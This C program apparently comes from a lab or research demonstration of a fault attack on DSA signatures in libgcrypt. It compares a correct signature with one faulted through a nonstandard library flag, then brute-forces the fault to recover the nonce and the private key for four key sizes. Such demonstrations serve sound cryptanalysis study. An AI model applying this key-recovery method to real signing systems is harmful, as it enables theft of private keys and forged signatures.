#include <stdio.h>
#include <string.h>
#include <gcrypt.h>


#define DEBUG_MPI_PRINT(mpi,msg) { printf("%s", msg); fflush(stdout); gcry_mpi_dump(mpi);}

#define DEBUG_SEXP_PRINT(sexp,msg) { printf("%s", msg); gcry_sexp_dump(sexp);}


//---------------------- GLOBAL VARIABLES ----------------------

//create the s-expressions for the key
gcry_sexp_t dsa_key_pair;
//name of the files in which the different keypairs are stored
char * files[] = {"DSA_KEY_1024", "DSA_KEY_2048_224", "DSA_KEY_2048_256" , "DSA_KEY_3072_256"};


//---------------------- FUNCTIONS ----------------------

//get the size of the key file
int get_file_size(FILE * fp){
    fseek(fp, 0L, SEEK_END);
    int size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    return size;
}

//build the s-expression of the key reading the file
void retrieve_key_pair(char * filename){

    void* dsa_buf; 
    gcry_error_t err;
    //open the correct file
    FILE * file = fopen(filename, "rb");

    if (!file) {
        puts("fopen() failed");
        exit(0);
    }
    //retrieve the file size
    int size = get_file_size(file);
    //allocate the buffer that will contain the key
    dsa_buf = malloc(size);
    if (!dsa_buf) {
        puts("malloc: could not allocate rsa buffer");
        exit(0);
    }
    //copy the content of the file in the buffer
    if (fread(dsa_buf, size, 1, file) != 1) {
       puts("fread() failed");
       exit(0);
    }
    //build the s-expression
    err = gcry_sexp_new(&dsa_key_pair, dsa_buf, size, 0); 

    if(err){
        puts("Error");
        exit(0);
    }
}


void attack(int i, unsigned char *digest, int hash_len){
	
    void* dsa_buf; 
	
    gcry_sexp_t new_dsa_key_pair;
    gcry_sexp_t ciphertext , plaintext, ptx2, ctx2;
	
    gcry_sexp_t r_param, r_tilda_param;
    gcry_sexp_t s_param, s_tilda_param;
    gcry_sexp_t g_param;
    gcry_sexp_t p_param;
    gcry_sexp_t q_param;
    gcry_sexp_t m_param;
    gcry_sexp_t y_param;

    gcry_sexp_t x_param;
    gcry_sexp_t misc_param;
	
    gcry_error_t err;
	
    gcry_mpi_t msg_digest, m;
	
    gcry_mpi_t r , r_tilda;
    gcry_mpi_t s , s_tilda;
    gcry_mpi_t g;
    gcry_mpi_t p;
    gcry_mpi_t q;
    gcry_mpi_t y;
    gcry_mpi_t x;
	
    retrieve_key_pair(files[i]);

    //*************** CORRECT SIGNATURE ********************//

	//20 is the mdlen of sha1 as specified in https://lists.gnupg.org/pipermail/gnupg-devel/2013-September/027916.html
    //a well formatted number for the immaediate has an even number of digits
    err = gcry_sexp_build(&plaintext, NULL, "(data (flags rfc6979) (hash %s %b))" , "sha1", hash_len , digest);
	
    err = gcry_pk_sign(&ciphertext, plaintext, dsa_key_pair);

    //now let's convert the s-expression representing r into an MPI in order
    //to use it in the equation of the attack 

    //--------- CIPHERTEXT --------------

    //intercepted during some sniffing...
    
    r_param = gcry_sexp_find_token(ciphertext, "r", 0);
    r = gcry_sexp_nth_mpi ( r_param , 1, GCRYMPI_FMT_USG);
         
    s_param = gcry_sexp_find_token(ciphertext, "s", 0);
    s = gcry_sexp_nth_mpi ( s_param , 1, GCRYMPI_FMT_USG);

    //--------- PUB KEY --------------
    
    g_param = gcry_sexp_find_token(dsa_key_pair, "g", 0);
    g = gcry_sexp_nth_mpi ( g_param , 1, GCRYMPI_FMT_USG);
    
    p_param = gcry_sexp_find_token(dsa_key_pair, "p", 0);
    p = gcry_sexp_nth_mpi ( p_param , 1, GCRYMPI_FMT_USG);
    
    q_param = gcry_sexp_find_token(dsa_key_pair, "q", 0);
    q = gcry_sexp_nth_mpi ( q_param , 1, GCRYMPI_FMT_USG);

    y_param = gcry_sexp_find_token(dsa_key_pair, "y", 0);
    y = gcry_sexp_nth_mpi ( y_param , 1, GCRYMPI_FMT_USG);

    x_param = gcry_sexp_find_token(dsa_key_pair, "x", 0);
    x = gcry_sexp_nth_mpi ( x_param , 1, GCRYMPI_FMT_USG);

    misc_param = gcry_sexp_find_token(dsa_key_pair, "misc-key-info", 0);

    //*************** FAULTY SIGNATURE ********************//

    err = gcry_sexp_build(&ptx2, NULL, "(data (flags rfc6979) (hash %s %b) (attack2_byte))" , "sha1", hash_len , digest);

    err = gcry_pk_sign(&ctx2, ptx2, dsa_key_pair);

    s_tilda_param = gcry_sexp_find_token(ctx2, "s", 0);
    s_tilda = gcry_sexp_nth_mpi ( s_tilda_param , 1, GCRYMPI_FMT_USG);


    r_tilda_param = gcry_sexp_find_token(ctx2, "r", 0);
    r_tilda = gcry_sexp_nth_mpi ( r_tilda_param , 1, GCRYMPI_FMT_USG);

    m_param = gcry_sexp_find_token(ptx2, "hash", 0);
    m = gcry_sexp_nth_mpi ( m_param , 2, GCRYMPI_FMT_USG);


    //NOW LET'S START THE ATTACK 

    unsigned long e = 0;

    unsigned int qbits = mpi_get_nbits(q);
    unsigned int pbits = mpi_get_nbits(p);

    int hash_len_bits = hash_len*8;

    gcry_mpi_t one = gcry_mpi_set_ui(NULL, 1);

    gcry_mpi_t tmp = gcry_mpi_new(qbits);

    gcry_mpi_t result = gcry_mpi_new(mpi_get_nbits(s));

    gcry_mpi_invm(r,r,q); // r^-1
    

    unsigned int j;

    for(e = 0; e < qbits ; e++){

       gcry_mpi_t empi = gcry_mpi_set_ui(NULL,e);
       gcry_mpi_t twoi = gcry_mpi_new(e);
       gcry_mpi_mul_2exp(empi, one, e);   // twoi = 2^e
       
	for( j=0; j< 256 ; j++){
        
        gcry_mpi_t jmpi = gcry_mpi_set_ui(NULL,j);
	gcry_mpi_mulm(twoi,jmpi,empi,q);
  
    	//retrieve k
        gcry_mpi_mulm(tmp, s_tilda, twoi, q); // s_tilda*(2^e) modq q
        gcry_mpi_subm(result, s_tilda, s, q); // s_tilda - s mod q
        gcry_mpi_invm(result, result, q); // (s_tilda - s mod q)^-1
        gcry_mpi_mulm(result,result, tmp, q); // s_tilda*(2^3)  mod q)*(s_tilda - s mod q)^-1 === k

        //retrieve x
        gcry_mpi_mulm(result, s, result,q); // s*k mod q
        gcry_mpi_subm(result, result, m, q); // s*k - m mod q
        gcry_mpi_mulm(result, result,r,q); //(s*k -m)*r^-1 mod q

        err = gcry_sexp_build(&new_dsa_key_pair,NULL,
                     "(key-data"
                     " (public-key"
                     "  (dsa(p%m)(q%m)(g%m)(y%m)))"
                     " (private-key"
                     "  (dsa(p%m)(q%m)(g%m)(y%m)(x%m))))",
                    p,q,g,y,p,q,g,y,result);

        err = gcry_pk_sign(&ctx2, plaintext, new_dsa_key_pair);

        err = gcry_pk_verify(ctx2, plaintext, dsa_key_pair);
    
        if (err) {
            //puts("gcrypt: verify failed");
	    continue;
        }
        else{
            printf("\n[!!!]PRIVATE KEY %d %d BITS CRACKED!!\n" , pbits,qbits );
    	    printf("[DBG] BYTE : %d * 2^%d  FAULT: k-j*2^%d\n" , j , (int)e,(int)e); //DEBUG 
            DEBUG_MPI_PRINT(result,"X = ");
	    printf("\n");
  	    return;  
        }
      }
    }
    
    for(e = 0; e < qbits; e++){

       gcry_mpi_t empi = gcry_mpi_set_ui(NULL,e);
       gcry_mpi_t twoi = gcry_mpi_new(e);
       gcry_mpi_mul_2exp(empi, one, e);   // twoi = 2^e
       
	for( j=0; j< 256 ; j++){
        
        gcry_mpi_t jmpi = gcry_mpi_set_ui(NULL,j);
	gcry_mpi_mulm(twoi,jmpi,empi,q);
  
        //retrieve k
        gcry_mpi_mulm(tmp, s_tilda, twoi, q); // s_tilda*(2^e) modq q
        gcry_mpi_subm(result, s, s_tilda, q); // s_tilda - s mod q
        gcry_mpi_invm(result, result, q); // (s_tilda - s mod q)^-1
        gcry_mpi_mulm(result,result, tmp, q); // s_tilda*(2^3)  mod q)*(s_tilda - s mod q)^-1 === k

        printf("K RECONSTRUCTED\n");
        gcry_mpi_dump(result);
        printf("\n");

        //retrieve x
        gcry_mpi_mulm(result, s, result,q); // s*k mod q
        gcry_mpi_subm(result, result, m, q); // s*k - m mod q
        gcry_mpi_mulm(result, result,r,q); //(s*k -m)*r^-1 mod q

        printf("X RECONSTRUCTED\n");
        gcry_mpi_dump(result);   //WORKING!!
        printf("\n");

        err = gcry_sexp_build(&new_dsa_key_pair,NULL,
                     "(key-data"
                     " (public-key"
                     "  (dsa(p%m)(q%m)(g%m)(y%m)))"
                     " (private-key"
                     "  (dsa(p%m)(q%m)(g%m)(y%m)(x%m))))",
                    p,q,g,y,p,q,g,y,result);

        err = gcry_pk_sign(&ctx2, plaintext, new_dsa_key_pair);

        err = gcry_pk_verify(ctx2, plaintext, dsa_key_pair);
    
        if (err) {
            continue;
        }
        else{
            printf("\n[!!!]PRIVATE KEY %d %d BITS CRACKED!!\n" , pbits,qbits );
    	    printf("[DBG] BYTE : %d * 2^%d  FAULT: k+j*2^%d\n" , j , (int)e,(int)e); //DEBUG 
            DEBUG_MPI_PRINT(result,"X = ");
	    printf("\n");
  	    return;  
        }	
    }
  }    
}



int main( int argc , char * argv[]){

    //*************** HASH THE MASSAGE ********************//

    const unsigned char* message = (const unsigned char * ) "Hello world.";

    //get the hash_len of sha-1
    int hash_len = gcry_md_get_algo_dlen(GCRY_MD_SHA1);

    unsigned char digest[hash_len];

    //calculate the hash in the binary representation
    //the gcry_sexp_build requires the binary representation of the hash (20 bytes long)
    //the ascii and the hex representations are 40 bytes long and this broke the HMAC computation when you try to sign your message 
    gcry_md_hash_buffer(GCRY_MD_SHA1, digest, message, strlen(message));

    //*************** ATTACK THE CIPHER FOR THE 3 STANDARD DSA KEY LENGTH ********************//
    int i = 0;
    clock_t t1, t2;
 
    puts("\n");

    for(i = 0; i<4; i++){
	
	printf("******** ATTACKING %s ******* \n" , files[i]);
 	t1 = clock(); 
        attack(i,digest,hash_len);
	t2 = clock(); 

	float diff = (((float)t2 - (float)t1) / 1000000.0F ) * 1000;  
 
	printf("PRIVATE KEY CRACKED IN %f ms\n " , diff );


 	printf("\n\n");
    
    }
 }











